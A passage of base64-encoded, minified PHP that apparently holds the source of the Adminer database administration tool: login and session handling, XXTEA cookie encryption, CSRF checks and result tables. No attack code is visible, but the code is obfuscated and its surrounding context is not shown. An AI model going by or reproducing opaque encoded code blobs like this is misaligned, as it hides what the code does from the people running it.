lY2hvIjxhIGhyZWY9JyIuKCRfP2goJF8pOiIuIikuIicgYWNjZXNza2V5PScxJyB0aXRsZT0nQWx0K1NoaWZ0KzEnPiROPC9hPiAmcmFxdW87ICI7aWYoJF9HRVRbIm5zIl0hPSIifHwoREIhPSIiJiZpc19hcnJheSgkVmEpKSllY2hvJzxhIGhyZWY9IicuaCgkXy4iJmRiPSIudXJsZW5jb2RlKERCKS4oc3VwcG9ydCgic2NoZW1lIik/IiZucz0iOiIiKSkuJyI+Jy5oKERCKS4nPC9hPiAmcmFxdW87ICc7aWYoaXNfYXJyYXkoJFZhKSl7aWYoJF9HRVRbIm5zIl0hPSIiKWVjaG8nPGEgaHJlZj0iJy5oKHN1YnN0cihNRSwwLC0xKSkuJyI+Jy5oKCRfR0VUWyJucyJdKS4nPC9hPiAmcmFxdW87ICc7Zm9yZWFjaCgkVmENCmFzJHg9PiRYKXskTWI9KGlzX2FycmF5KCRYKT8kWFsxXTpoKCRYKSk7aWYoJE1iIT0iIillY2hvIjxhIGhyZWY9JyIuaChNRS4iJHg9IikudXJsZW5jb2RlKGlzX2FycmF5KCRYKT8kWFswXTokWCkuIic+JE1iPC9hPiAmcmFxdW87ICI7fX1lY2hvIiRpaFxuIjt9fWVjaG8iPGgyPiRraDwvaDI+XG4iLCI8ZGl2IGlkPSdhamF4c3RhdHVzJyBjbGFzcz0nanNvbmx5IGhpZGRlbic+PC9kaXY+XG4iO3Jlc3RhcnRfc2Vzc2lvbigpO3BhZ2VfbWVzc2FnZXMoJG4pOyRsPSZnZXRfc2Vzc2lvbigiZGJzIik7aWYoREIhPSIiJiYkbCYmIWluX2FycmF5KERCLCRsLHRydWUpKSRsPW51bGw7c3RvcF9zZXNzaW9uKCk7ZGVmaW5lKCJQQUdFX0hFQURFUiIsMSk7fWZ1bmN0aW9uDQpwYWdlX2hlYWRlcnMoKXtnbG9iYWwkYjtoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7aGVhZGVyKCJDYWNoZS1Db250cm9sOiBuby1jYWNoZSIpO2lmKCRiLT5oZWFkZXJzKCkpe2hlYWRlcigiWC1GcmFtZS1PcHRpb25zOiBkZW55Iik7aGVhZGVyKCJYLVhTUy1Qcm90ZWN0aW9uOiAwIik7fX1mdW5jdGlvbg0KcGFnZV9tZXNzYWdlcygkbil7JEhoPXByZWdfcmVwbGFjZSgnfl5bXj9dKn4nLCcnLCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdKTskbWU9JF9TRVNTSU9OWyJtZXNzYWdlcyJdWyRIaF07aWYoJG1lKXtlY2hvIjxkaXYgY2xhc3M9J21lc3NhZ2UnPiIuaW1wbG9kZSgiPC9kaXY+XG48ZGl2IGNsYXNzPSdtZXNzYWdlJz4iLCRtZSkuIjwvZGl2PlxuIjt1bnNldCgkX1NFU1NJT05bIm1lc3NhZ2VzIl1bJEhoXSk7fWlmKCRuKWVjaG8iPGRpdiBjbGFzcz0nZXJyb3InPiRuPC9kaXY+XG4iO31mdW5jdGlvbg0KcGFnZV9mb290ZXIoJHFlPSIiKXtnbG9iYWwkYiwkVDtlY2hvJzwvZGl2Pg0KDQonO2lmKCRxZSE9ImF1dGgiKXtlY2hvJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KPHAgY2xhc3M9ImxvZ291dCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJsb2dvdXQiIHZhbHVlPSJMb2dvdXQiIGlkPSJsb2dvdXQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSInLCRULCciPg0KPC9wPg0KPC9mb3JtPg0KJzt9ZWNobyc8ZGl2IGlkPSJtZW51Ij4NCic7JGItPm5hdmlnYXRpb24oJHFlKTtlY2hvJzwvZGl2Pg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPnNldHVwU3VibWl0SGlnaGxpZ2h0KGRvY3VtZW50KTs8L3NjcmlwdD4NCic7fWZ1bmN0aW9uDQppbnQzMigkdGUpe3doaWxlKCR0ZT49MjE0NzQ4MzY0OCkkdGUtPTQyOTQ5NjcyOTY7d2hpbGUoJHRlPD0tMjE0NzQ4MzY0OSkkdGUrPTQyOTQ5NjcyOTY7cmV0dXJuKGludCkkdGU7fWZ1bmN0aW9uDQpsb25nMnN0cigkVywkWGgpeyRpZz0nJztmb3JlYWNoKCRXDQphcyRYKSRpZy49cGFjaygnVicsJFgpO2lmKCRYaClyZXR1cm4NCnN1YnN0cigkaWcsMCxlbmQoJFcpKTtyZXR1cm4kaWc7fWZ1bmN0aW9uDQpzdHIybG9uZygkaWcsJFhoKXskVz1hcnJheV92YWx1ZXModW5wYWNrKCdWKicsc3RyX3BhZCgkaWcsNCpjZWlsKHN0cmxlbigkaWcpLzQpLCJcMCIpKSk7aWYoJFhoKSRXW109c3RybGVuKCRpZyk7cmV0dXJuJFc7fWZ1bmN0aW9uDQp4eHRlYV9teCgkZGksJGNpLCRNZywkRWQpe3JldHVybg0KaW50MzIoKCgkZGk+PjUmMHg3RkZGRkZGKV4kY2k8PDIpKygoJGNpPj4zJjB4MUZGRkZGRkYpXiRkaTw8NCkpXmludDMyKCgkTWdeJGNpKSsoJEVkXiRkaSkpO31mdW5jdGlvbg0KZW5jcnlwdF9zdHJpbmcoJEhnLCR4KXtpZigkSGc9PSIiKXJldHVybiIiOyR4PWFycmF5X3ZhbHVlcyh1bnBhY2soIlYqIixwYWNrKCJIKiIsbWQ1KCR4KSkpKTskVz1zdHIybG9uZygkSGcsdHJ1ZSk7JHRlPWNvdW50KCRXKS0xOyRkaT0kV1skdGVdOyRjaT0kV1swXTskSGY9Zmxvb3IoNis1Mi8oJHRlKzEpKTskTWc9MDt3aGlsZSgkSGYtLT4wKXskTWc9aW50MzIoJE1nKzB4OUUzNzc5QjkpOyRjYz0kTWc+PjImMztmb3IoJGVmPTA7JGVmPCR0ZTskZWYrKyl7JGNpPSRXWyRlZisxXTskc2U9eHh0ZWFfbXgoJGRpLCRjaSwkTWcsJHhbJGVmJjNeJGNjXSk7JGRpPWludDMyKCRXWyRlZl0rJHNlKTskV1skZWZdPSRkaTt9JGNpPSRXWzBdOyRzZT14eHRlYV9teCgkZGksJGNpLCRNZywkeFskZWYmM14kY2NdKTskZGk9aW50MzIoJFdbJHRlXSskc2UpOyRXWyR0ZV09JGRpO31yZXR1cm4NCmxvbmcyc3RyKCRXLGZhbHNlKTt9ZnVuY3Rpb24NCmRlY3J5cHRfc3RyaW5nKCRIZywkeCl7aWYoJEhnPT0iIilyZXR1cm4iIjtpZighJHgpcmV0dXJuDQpmYWxzZTskeD1hcnJheV92YWx1ZXModW5wYWNrKCJWKiIscGFjaygiSCoiLG1kNSgkeCkpKSk7JFc9c3RyMmxvbmcoJEhnLGZhbHNlKTskdGU9Y291bnQoJFcpLTE7JGRpPSRXWyR0ZV07JGNpPSRXWzBdOyRIZj1mbG9vcig2KzUyLygkdGUrMSkpOyRNZz1pbnQzMigkSGYqMHg5RTM3NzlCOSk7d2hpbGUoJE1nKXskY2M9JE1nPj4yJjM7Zm9yKCRlZj0kdGU7JGVmPjA7JGVmLS0peyRkaT0kV1skZWYtMV07JHNlPXh4dGVhX214KCRkaSwkY2ksJE1nLCR4WyRlZiYzXiRjY10pOyRjaT1pbnQzMigkV1skZWZdLSRzZSk7JFdbJGVmXT0kY2k7fSRkaT0kV1skdGVdOyRzZT14eHRlYV9teCgkZGksJGNpLCRNZywkeFskZWYmM14kY2NdKTskY2k9aW50MzIoJFdbMF0tJHNlKTskV1swXT0kY2k7JE1nPWludDMyKCRNZy0weDlFMzc3OUI5KTt9cmV0dXJuDQpsb25nMnN0cigkVyx0cnVlKTt9JGc9Jyc7JGJkPSRfU0VTU0lPTlsidG9rZW4iXTtpZighJGJkKSRfU0VTU0lPTlsidG9rZW4iXT1yYW5kKDEsMWU2KTskVD1nZXRfdG9rZW4oKTskcWY9YXJyYXkoKTtpZigkX0NPT0tJRVsiYWRtaW5lcl9wZXJtYW5lbnQiXSl7Zm9yZWFjaChleHBsb2RlKCIgIiwkX0NPT0tJRVsiYWRtaW5lcl9wZXJtYW5lbnQiXSlhcyRYKXtsaXN0KCR4KT1leHBsb2RlKCI6IiwkWCk7JHFmWyR4XT0kWDt9fWZ1bmN0aW9uDQphZGRfaW52YWxpZF9sb2dpbigpe2dsb2JhbCRiOyRHYz1nZXRfdGVtcF9kaXIoKS4iL2FkbWluZXIuaW52YWxpZCI7JFFjPUBmb3BlbigkR2MsInIrIik7aWYoISRRYyl7JFFjPUBmb3BlbigkR2MsInciKTtpZighJFFjKXJldHVybjt9ZmxvY2soJFFjLExPQ0tfRVgpOyR4ZD11bnNlcmlhbGl6ZShzdHJlYW1fZ2V0X2NvbnRlbnRzKCRRYykpOyRmaD10aW1lKCk7aWYoJHhkKXtmb3JlYWNoKCR4ZA0KYXMkeWQ9PiRYKXtpZigkWFswXTwkZmgpdW5zZXQoJHhkWyR5ZF0pO319JHdkPSYkeGRbJGItPmJydXRlRm9yY2VLZXkoKV07aWYoISR3ZCkkd2Q9YXJyYXkoJGZoKzMwKjYwLDApOyR3ZFsxXSsrOyR0Zz1zZXJpYWxpemUoJHhkKTtyZXdpbmQoJFFjKTtmd3JpdGUoJFFjLCR0Zyk7ZnRydW5jYXRlKCRRYyxzdHJsZW4oJHRnKSk7ZmxvY2soJFFjLExPQ0tfVU4pO2ZjbG9zZSgkUWMpO30kSmE9JF9QT1NUWyJhdXRoIl07aWYoJEphKXskeGQ9dW5zZXJpYWxpemUoQGZpbGVfZ2V0X2NvbnRlbnRzKGdldF90ZW1wX2RpcigpLiIvYWRtaW5lci5pbnZhbGlkIikpOyR3ZD0keGRbJGItPmJydXRlRm9yY2VLZXkoKV07JHplPSgkd2RbMV0+MzA/JHdkWzBdLXRpbWUoKTowKTtpZigkemU+MClhdXRoX2Vycm9yKGxhbmcoYXJyYXkoJ1RvbyBtYW55IHVuc3VjY2Vzc2Z1bCBsb2dpbnMsIHRyeSBhZ2FpbiBpbiAlZCBtaW51dGUuJywnVG9vIG1hbnkgdW5zdWNjZXNzZnVsIGxvZ2lucywgdHJ5IGFnYWluIGluICVkIG1pbnV0ZXMuJyksY2VpbCgkemUvNjApKSk7c2Vzc2lvbl9yZWdlbmVyYXRlX2lkKCk7JFNoPSRKYVsiZHJpdmVyIl07JE49JEphWyJzZXJ2ZXIiXTskVj0kSmFbInVzZXJuYW1lIl07JEc9KHN0cmluZykkSmFbInBhc3N3b3JkIl07JG09JEphWyJkYiJdO3NldF9wYXNzd29yZCgkU2gsJE4sJFYsJEcpOyRfU0VTU0lPTlsiZGIiXVskU2hdWyROXVskVl1bJG1dPXRydWU7aWYoJEphWyJwZXJtYW5lbnQiXSl7JHg9YmFzZTY0X2VuY29kZSgkU2gpLiItIi5iYXNlNjRfZW5jb2RlKCROKS4iLSIuYmFzZTY0X2VuY29kZSgkVikuIi0iLmJhc2U2NF9lbmNvZGUoJG0pOyRCZj0kYi0+cGVybWFuZW50TG9naW4odHJ1ZSk7JHFmWyR4XT0iJHg6Ii5iYXNlNjRfZW5jb2RlKCRCZj9lbmNyeXB0X3N0cmluZygkRywkQmYpOiIiKTtjb29raWUoImFkbWluZXJfcGVybWFuZW50IixpbXBsb2RlKCIgIiwkcWYpKTt9aWYoY291bnQoJF9QT1NUKT09MXx8RFJJVkVSIT0kU2h8fFNFUlZFUiE9JE58fCRfR0VUWyJ1c2VybmFtZSJdIT09JFZ8fERCIT0kbSlyZWRpcmVjdChhdXRoX3VybCgkU2gsJE4sJFYsJG0pKTt9ZWxzZWlmKCRfUE9TVFsibG9nb3V0Il0pe2lmKCRiZCYmIXZlcmlmeV90b2tlbigpKXtwYWdlX2hlYWRlcignTG9nb3V0JywnSW52YWxpZCBDU1JGIHRva2VuLiBTZW5kIHRoZSBmb3JtIGFnYWluLicpO3BhZ2VfZm9vdGVyKCJkYiIpO2V4aXQ7fWVsc2V7Zm9yZWFjaChhcnJheSgicHdkcyIsImRiIiwiZGJzIiwicXVlcmllcyIpYXMkeClzZXRfc2Vzc2lvbigkeCxudWxsKTt1bnNldF9wZXJtYW5lbnQoKTtyZWRpcmVjdChzdWJzdHIocHJlZ19yZXBsYWNlKCd+XGIodXNlcm5hbWV8ZGJ8bnMpPVteJl0qJn4nLCcnLE1FKSwwLC0xKSwnTG9nb3V0IHN1Y2Nlc3NmdWwuJyk7fX1lbHNlaWYoJHFmJiYhJF9TRVNTSU9OWyJwd2RzIl0pe3Nlc3Npb25fcmVnZW5lcmF0ZV9pZCgpOyRCZj0kYi0+cGVybWFuZW50TG9naW4oKTtmb3JlYWNoKCRxZg0KYXMkeD0+JFgpe2xpc3QoLCRnYik9ZXhwbG9kZSgiOiIsJFgpO2xpc3QoJFNoLCROLCRWLCRtKT1hcnJheV9tYXAoJ2Jhc2U2NF9kZWNvZGUnLGV4cGxvZGUoIi0iLCR4KSk7c2V0X3Bhc3N3b3JkKCRTaCwkTiwkVixkZWNyeXB0X3N0cmluZyhiYXNlNjRfZGVjb2RlKCRnYiksJEJmKSk7JF9TRVNTSU9OWyJkYiJdWyRTaF1bJE5dWyRWXVskbV09dHJ1ZTt9fWZ1bmN0aW9uDQp1bnNldF9wZXJtYW5lbnQoKXtnbG9iYWwkcWY7Zm9yZWFjaCgkcWYNCmFzJHg9PiRYKXtsaXN0KCRTaCwkTiwkViwkbSk9YXJyYXlfbWFwKCdiYXNlNjRfZGVjb2RlJyxleHBsb2RlKCItIiwkeCkpO2lmKCRTaD09RFJJVkVSJiYkTj09U0VSVkVSJiYkVj09JF9HRVRbInVzZXJuYW1lIl0mJiRtPT1EQil1bnNldCgkcWZbJHhdKTt9Y29va2llKCJhZG1pbmVyX3Blcm1hbmVudCIsaW1wbG9kZSgiICIsJHFmKSk7fWZ1bmN0aW9uDQphdXRoX2Vycm9yKCRuKXtnbG9iYWwkYiwkYmQ7JG49aCgkbik7JHdnPXNlc3Npb25fbmFtZSgpO2lmKGlzc2V0KCRfR0VUWyJ1c2VybmFtZSJdKSl7aGVhZGVyKCJIVFRQLzEuMSA0MDMgRm9yYmlkZGVuIik7aWYoKCRfQ09PS0lFWyR3Z118fCRfR0VUWyR3Z10pJiYhJGJkKSRuPSdTZXNzaW9uIGV4cGlyZWQsIHBsZWFzZSBsb2dpbiBhZ2Fpbi4nO2Vsc2V7YWRkX2ludmFsaWRfbG9naW4oKTskRz1nZXRfcGFzc3dvcmQoKTtpZigkRyE9PW51bGwpe2lmKCRHPT09ZmFsc2UpJG4uPSc8YnI+Jy5zcHJpbnRmKCdNYXN0ZXIgcGFzc3dvcmQgZXhwaXJlZC4gPGEgaHJlZj0iaHR0cHM6Ly93d3cuYWRtaW5lci5vcmcvZW4vZXh0ZW5zaW9uLyIgdGFyZ2V0PSJfYmxhbmsiPkltcGxlbWVudDwvYT4gJXMgbWV0aG9kIHRvIG1ha2UgaXQgcGVybWFuZW50LicsJzxjb2RlPnBlcm1hbmVudExvZ2luKCk8L2NvZGU+Jyk7c2V0X3Bhc3N3b3JkKERSSVZFUixTRVJWRVIsJF9HRVRbInVzZXJuYW1lIl0sbnVsbCk7fXVuc2V0X3Blcm1hbmVudCgpO319aWYoISRfQ09PS0lFWyR3Z10mJiRfR0VUWyR3Z10mJmluaV9ib29sKCJzZXNzaW9uLnVzZV9vbmx5X2Nvb2tpZXMiKSkkbj0nU2Vzc2lvbiBzdXBwb3J0IG11c3QgYmUgZW5hYmxlZC4nOyRGPXNlc3Npb25fZ2V0X2Nvb2tpZV9wYXJhbXMoKTtjb29raWUoImFkbWluZXJfa2V5IiwoJF9DT09LSUVbImFkbWluZXJfa2V5Il0/JF9DT09LSUVbImFkbWluZXJfa2V5Il06cmFuZF9zdHJpbmcoKSksJEZbImxpZmV0aW1lIl0pO3BhZ2VfaGVhZGVyKCdMb2dpbicsJG4sbnVsbCk7ZWNobyI8Zm9ybSBhY3Rpb249JycgbWV0aG9kPSdwb3N0Jz5cbiI7JGItPmxvZ2luRm9ybSgpO2VjaG8iPGRpdj4iO2hpZGRlbl9maWVsZHMoJF9QT1NULGFycmF5KCJhdXRoIikpO2VjaG8iPC9kaXY+XG4iLCI8L2Zvcm0+XG4iO3BhZ2VfZm9vdGVyKCJhdXRoIik7ZXhpdDt9aWYoaXNzZXQoJF9HRVRbInVzZXJuYW1lIl0pKXtpZighY2xhc3NfZXhpc3RzKCJNaW5fREIiKSl7dW5zZXQoJF9TRVNTSU9OWyJwd2RzIl1bRFJJVkVSXSk7dW5zZXRfcGVybWFuZW50KCk7cGFnZV9oZWFkZXIoJ05vIGV4dGVuc2lvbicsc3ByaW50ZignTm9uZSBvZiB0aGUgc3VwcG9ydGVkIFBIUCBleHRlbnNpb25zICglcykgYXJlIGF2YWlsYWJsZS4nLGltcGxvZGUoIiwgIiwkd2YpKSxmYWxzZSk7cGFnZV9mb290ZXIoImF1dGgiKTtleGl0O30kZz1jb25uZWN0KCk7fSRVYj1uZXcNCk1pbl9Ecml2ZXIoJGcpO2lmKCFpc19vYmplY3QoJGcpfHwoJFdkPSRiLT5sb2dpbigkX0dFVFsidXNlcm5hbWUiXSxnZXRfcGFzc3dvcmQoKSkpIT09dHJ1ZSlhdXRoX2Vycm9yKChpc19zdHJpbmcoJGcpPyRnOihpc19zdHJpbmcoJFdkKT8kV2Q6J0ludmFsaWQgY3JlZGVudGlhbHMuJykpKTtpZigkSmEmJiRfUE9TVFsidG9rZW4iXSkkX1BPU1RbInRva2VuIl09JFQ7JG49Jyc7aWYoJF9QT1NUKXtpZighdmVyaWZ5X3Rva2VuKCkpeyRyZD0ibWF4X2lucHV0X3ZhcnMiOyRnZT1pbmlfZ2V0KCRyZCk7aWYoZXh0ZW5zaW9uX2xvYWRlZCgic3Vob3NpbiIpKXtmb3JlYWNoKGFycmF5KCJzdWhvc2luLnJlcXVlc3QubWF4X3ZhcnMiLCJzdWhvc2luLnBvc3QubWF4X3ZhcnMiKWFzJHgpeyRYPWluaV9nZXQoJHgpO2lmKCRYJiYoISRnZXx8JFg8JGdlKSl7JHJkPSR4OyRnZT0kWDt9fX0kbj0oISRfUE9TVFsidG9rZW4iXSYmJGdlP3NwcmludGYoJ01heGltdW0gbnVtYmVyIG9mIGFsbG93ZWQgZmllbGRzIGV4Y2VlZGVkLiBQbGVhc2UgaW5jcmVhc2UgJXMuJywiJyRyZCciKTonSW52YWxpZCBDU1JGIHRva2VuLiBTZW5kIHRoZSBmb3JtIGFnYWluLicuJyAnLidJZiB5b3UgZGlkIG5vdCBzZW5kIHRoaXMgcmVxdWVzdCBmcm9tIEFkbWluZXIgdGhlbiBjbG9zZSB0aGlzIHBhZ2UuJyk7fX1lbHNlaWYoJF9TRVJWRVJbIlJFUVVFU1RfTUVUSE9EIl09PSJQT1NUIil7JG49c3ByaW50ZignVG9vIGJpZyBQT1NUIGRhdGEuIFJlZHVjZSB0aGUgZGF0YSBvciBpbmNyZWFzZSB0aGUgJXMgY29uZmlndXJhdGlvbiBkaXJlY3RpdmUuJywiJ3Bvc3RfbWF4X3NpemUnIik7aWYoaXNzZXQoJF9HRVRbInNxbCJdKSkkbi49JyAnLidZb3UgY2FuIHVwbG9hZCBhIGJpZyBTUUwgZmlsZSB2aWEgRlRQIGFuZCBpbXBvcnQgaXQgZnJvbSBzZXJ2ZXIuJzt9aWYoIWluaV9ib29sKCJzZXNzaW9uLnVzZV9jb29raWVzIil8fEBpbmlfc2V0KCJzZXNzaW9uLnVzZV9jb29raWVzIixmYWxzZSkhPT1mYWxzZSlzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7ZnVuY3Rpb24NCnNlbGVjdCgkSSwkaD1udWxsLCRXZT1hcnJheSgpLCR6PTApe2dsb2JhbCR3OyRWZD1hcnJheSgpOyR2PWFycmF5KCk7JGY9YXJyYXkoKTskU2E9YXJyYXkoKTskemg9YXJyYXkoKTskSj1hcnJheSgpO29kZCgnJyk7Zm9yKCRzPTA7KCEkenx8JHM8JHopJiYoJEs9JEktPmZldGNoX3JvdygpKTskcysrKXtpZighJHMpe2VjaG8iPHRhYmxlIGNlbGxzcGFjaW5nPScwJyBjbGFzcz0nbm93cmFwJz5cbiIsIjx0aGVhZD48dHI+Ijtmb3IoJERkPTA7JERkPGNvdW50KCRLKTskRGQrKyl7JG89JEktPmZldGNoX2ZpZWxkKCk7JEM9JG8tPm5hbWU7JFZlPSRvLT5vcmd0YWJsZTskVWU9JG8tPm9yZ25hbWU7JEpbJG8tPnRhYmxlXT0kVmU7aWYoJFdlJiYkdz09InNxbCIpJFZkWyREZF09KCRDPT0idGFibGUiPyJ0YWJsZT0iOigkQz09InBvc3NpYmxlX2tleXMiPyJpbmRleGVzPSI6bnVsbCkpO2Vsc2VpZigkVmUhPSIiKXtpZighaXNzZXQoJHZbJFZlXSkpeyR2WyRWZV09YXJyYXkoKTtmb3JlYWNoKGluZGV4ZXMoJFZlLCRoKWFzJHUpe2lmKCR1WyJ0eXBlIl09PSJQUklNQVJZIil7JHZbJFZlXT1hcnJheV9mbGlwKCR1WyJjb2x1bW5zIl0pO2JyZWFrO319JGZbJFZlXT0kdlskVmVdO31pZihpc3NldCgkZlskVmVdWyRVZV0pKXt1bnNldCgkZlskVmVdWyRVZV0pOyR2WyRWZV1bJFVlXT0kRGQ7JFZkWyREZF09JFZlO319aWYoJG8tPmNoYXJzZXRucj09NjMpJFNhWyREZF09dHJ1ZTskemhbJERkXT0kby0+dHlwZTtlY2hvIjx0aCIuKCRWZSE9IiJ8fCRvLT5uYW1lIT0kVWU/IiB0aXRsZT0nIi5oKCgkVmUhPSIiPyIkVmUuIjoiIikuJFVlKS4iJyI6IiIpLiI+Ii5oKCRDKS4oJFdlP2RvY19saW5rKGFycmF5KCdzcWwnPT4iZXhwbGFpbi1vdXRwdXQuaHRtbCNleHBsYWluXyIuc3RydG9sb3dlcigkQykpKToiIik7fWVjaG8iPC90aGVhZD5cbiI7fWVjaG8iPHRyIi5vZGQoKS4iPiI7Zm9yZWFjaCgkSw0KYXMkeD0+JFgpe2lmKCRYPT09bnVsbCkkWD0iPGk+TlVMTDwvaT4iO2Vsc2VpZigkU2FbJHhdJiYhaXNfdXRmOCgkWCkpJFg9IjxpPiIubGFuZyhhcnJheSgnJWQgYnl0ZScsJyVkIGJ5dGVzJyksc3RybGVuKCRYKSkuIjwvaT4iO2Vsc2VpZighc3RybGVuKCRYKSkkWD0iJm5ic3A7IjtlbHNleyRYPWgoJFgpO2lmKCR6aFskeF09PTI1NCkkWD0iPGNvZGU+JFg8L2NvZGU+Ijt9aWYoaXNzZXQoJFZkWyR4XSkmJiEkZlskVmRbJHhdXSl7aWYoJFdlJiYkdz09InNxbCIpeyRRPSRLW2FycmF5X3NlYXJjaCgidGFibGU9IiwkVmQpXTskXz0kVmRbJHhdLnVybGVuY29kZSgkV2VbJFFdIT0iIj8kV2VbJFFdOiRRKTt9ZWxzZXskXz0iZWRpdD0iLnVybGVuY29kZSgkVmRbJHhdKTtmb3JlYWNoKCR2WyRWZFskeF1dYXMka2I9PiREZCkkXy49IiZ3aGVyZSIudXJsZW5jb2RlKCJbIi5icmFja2V0X2VzY2FwZSgka2IpLiJdIikuIj0iLnVybGVuY29kZSgkS1skRGRdKTt9JFg9IjxhIGhyZWY9JyIuaChNRS4kXykuIic+JFg8L2E+Ijt9ZWNobyI8dGQ+JFgiO319ZWNobygkcz8iPC90YWJsZT4iOiI8cCBjbGFzcz0nbWVzc2FnZSc+Ii4nTm8gcm93cy4nKS4iXG4iO3JldHVybiRKO31mdW5jdGlvbg0KcmVmZXJlbmNhYmxlX3ByaW1hcnkoJHFnKXskSj1hcnJheSgpO2ZvcmVhY2godGFibGVfc3RhdHVzKCcnLHRydWUpYXMkUWc9PiRRKXtpZigkUWchPSRxZyYmZmtfc3VwcG9ydCgkUSkpe2ZvcmVhY2goZmllbGRzKCRRZylhcyRvKXtpZigkb1sicHJpbWFyeSJdKXtpZigkSlskUWddKXt1bnNldCgkSlskUWddKTticmVhazt9JEpbJFFnXT0kbzt9fX19cmV0dXJuJEo7fWZ1bmN0aW9uDQp0ZXh0YXJlYSgkQywkWSwkTD0xMCwkbmI9ODApe2dsb2JhbCR3O2VjaG8iPHRleHRhcmVhIG5hbWU9JyRDJyByb3dzPSckTCcgY29scz0nJG5iJyBjbGFzcz0nc3FsYXJlYSBqdXNoLSR3JyBzcGVsbGNoZWNrPSdmYWxzZScgd3JhcD0nb2ZmJz4iO2lmKGlzX2FycmF5KCRZKSl7Zm9yZWFjaCgkWQ0KYXMkWCllY2hvDQpoKCRYWzBdKS4iXG5cblxuIjt9ZWxzZQ0KZWNobw0KaCgkWSk7ZWNobyI8L3RleHRhcmVhPiI7fWZ1bmN0aW9uDQplZGl0X3R5cGUoJHgsJG8sJG1iLCRNYz1hcnJheSgpKXtnbG9iYWwkSWcsJHpoLCRGaCwkSmU7JFU9JG9bInR5cGUiXTtlY2hvJzx0ZD48c2VsZWN0IG5hbWU9IicsaCgkeCksJ1t0eXBlXSIgY2xhc3M9InR5cGUiIG9uZm9jdXM9Imxhc3RUeXBlID0gc2VsZWN0VmFsdWUodGhpcyk7IiBvbmNoYW5nZT0iZWRpdGluZ1R5cGVDaGFuZ2UodGhpcyk7Iicsb25faGVscCgiZ2V0VGFyZ2V0KGV2ZW50KS52YWx1ZSIsMSksJz4nO2lmKCRVJiYhaXNzZXQoJHpoWyRVXSkmJiFpc3NldCgkTWNbJFVdKSlhcnJheV91bnNoaWZ0KCRJZywkVSk7aWYoJE1jKSRJZ1snRm9yZWlnbiBrZXlzJ109JE1jO2VjaG8NCm9wdGlvbmxpc3QoJElnLCRVKSwnPC9zZWxlY3Q+DQo8dGQ+PGlucHV0IG5hbWU9IicsaCgkeCksJ1tsZW5ndGhdIiB2YWx1ZT0iJyxoKCRvWyJsZW5ndGgiXSksJyIgc2l6ZT0iMyIgb25mb2N1cz0iZWRpdGluZ0xlbmd0aEZvY3VzKHRoaXMpOyInLCghJG9bImxlbmd0aCJdJiZwcmVnX21hdGNoKCd+dmFyKGNoYXJ8YmluYXJ5KSR+JywkVSk/IiBjbGFzcz0ncmVxdWlyZWQnIjoiIiksJyBvbmNoYW5nZT0iZWRpdGluZ0xlbmd0aENoYW5nZSh0aGlzKTsiIG9ua2V5dXA9InRoaXMub25jaGFuZ2UoKTsiPjx0ZCBjbGFzcz0ib3B0aW9ucyI+JztlY2hvIjxzZWxlY3QgbmFtZT0nIi5oKCR4KS4iW2NvbGxhdGlvbl0nIi4ocHJlZ19tYXRjaCgnfihjaGFyfHRleHR8ZW51bXxzZXQpJH4nLCRVKT8iIjoiIGNsYXNzPSdoaWRkZW4nIikuJz48b3B0aW9uIHZhbHVlPSIiPignLidjb2xsYXRpb24nLicpJy5vcHRpb25saXN0KCRtYiwkb1siY29sbGF0aW9uIl0pLic8L3NlbGVjdD4nLCgkRmg/IjxzZWxlY3QgbmFtZT0nIi5oKCR4KS4iW3Vuc2lnbmVkXSciLighJFV8fHByZWdfbWF0Y2goJ34oKF58W15vXSlpbnR8ZmxvYXR8ZG91YmxlfGRlY2ltYWwpJH4nLCRVKT8iIjoiIGNsYXNzPSdoaWRkZW4nIikuJz48b3B0aW9uPicub3B0aW9ubGlzdCgkRmgsJG9bInVuc2lnbmVkIl0pLic8L3NlbGVjdD4nOicnKSwoaXNzZXQoJG9bJ29uX3VwZGF0ZSddKT8iPHNlbGVjdCBuYW1lPSciLmgoJHgpLiJbb25fdXBkYXRlXSciLihwcmVnX21hdGNoKCd+dGltZXN0YW1wfGRhdGV0aW1lficsJFUpPyIiOiIgY2xhc3M9J2hpZGRlbiciKS4nPicub3B0aW9ubGlzdChhcnJheSgiIj0+IigiLidPTiBVUERBVEUnLiIpIiwiQ1VSUkVOVF9USU1FU1RBTVAiKSwkb1sib25fdXBkYXRlIl0pLic8L3NlbGVjdD4nOicnKSwoJE1jPyI8c2VsZWN0IG5hbWU9JyIuaCgkeCkuIltvbl9kZWxldGVdJyIuKHByZWdfbWF0Y2goIn5gfiIsJFUpPyIiOiIgY2xhc3M9J2hpZGRlbiciKS4iPjxvcHRpb24gdmFsdWU9Jyc+KCIuJ09OIERFTEVURScuIikiLm9wdGlvbmxpc3QoZXhwbG9kZSgifCIsJEplKSwkb1sib25fZGVsZXRlIl0pLiI8L3NlbGVjdD4gIjoiICIpO31mdW5jdGlvbg0KcHJvY2Vzc19sZW5ndGgoJHkpe2dsb2JhbCRuYztyZXR1cm4ocHJlZ19tYXRjaCgifl5cXHMqXFwoP1xccyokbmMoPzpcXHMqLFxccyokbmMpKitcXHMqXFwpP1xccypcJH4iLCR5KSYmcHJlZ19tYXRjaF9hbGwoIn4kbmN+IiwkeSwkYWUpPyIoIi5pbXBsb2RlKCIsIiwkYWVbMF0pLiIpIjpwcmVnX3JlcGxhY2UoJ35eWzAtOV0uKn4nLCcoXDApJyxwcmVnX3JlcGxhY2UoJ35bXi0wLTksKygpW1xdXX4nLCcnLCR5KSkpO31mdW5jdGlvbg0KcHJvY2Vzc190eXBlKCRvLCRsYj0iQ09MTEFURSIpe2dsb2JhbCRGaDtyZXR1cm4iICRvW3R5cGVdIi5wcm9jZXNzX2xlbmd0aCgkb1sibGVuZ3RoIl0pLihwcmVnX21hdGNoKCd+KF58W15vXSlpbnR8ZmxvYXR8ZG91YmxlfGRlY2ltYWx+Jywkb1sidHlwZSJdKSYmaW5fYXJyYXkoJG9bInVuc2lnbmVkIl0sJEZoKT8iICRvW3Vuc2lnbmVkXSI6IiIpLihwcmVnX21hdGNoKCd+Y2hhcnx0ZXh0f